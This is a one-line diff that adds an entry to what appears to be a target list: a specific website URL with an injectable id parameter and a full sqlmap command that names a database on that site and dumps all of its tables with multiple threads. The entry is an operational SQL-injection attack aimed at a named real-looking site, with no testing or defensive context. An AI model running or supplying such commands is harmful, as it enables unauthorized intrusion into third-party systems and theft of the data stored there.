@@ -1,0 +1,1 @@
+http://www.attocontabil.com.br/noticia.php?id=6 (GET)  # sqlmap.py -u http://www.attocontabil.com.br/noticia.php?id=6 -D db217553_aella --tables --dump-all --threads 10 -v3
